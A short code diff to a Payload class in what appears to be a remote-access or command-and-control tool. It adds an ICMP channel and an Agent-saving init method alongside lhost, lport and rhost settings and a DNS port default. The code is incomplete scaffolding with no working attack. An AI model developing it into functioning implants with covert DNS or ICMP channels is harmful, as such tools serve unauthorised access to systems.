@@ -1,3 +1,6 @@
+from channels.icmp import *
+from modules.control import *
+
 class Payload:
 
     def __init__(self, lhost='_________', lport='___', rhost='_________', channel='____'):
@@ -24,4 +27,12 @@ class Payload:
             self.lport = 53
         if channel == 'ICMP':
             self.lport = '-'
-    # def make(self):
+    
+#    def make(self):
+
+    def init(self, lhost, lport, rhost, channel):
+        if channel == 'ICMP':
+            Icmp().wait(lhost, rhost)
+        
+        Agent(self).save()
+
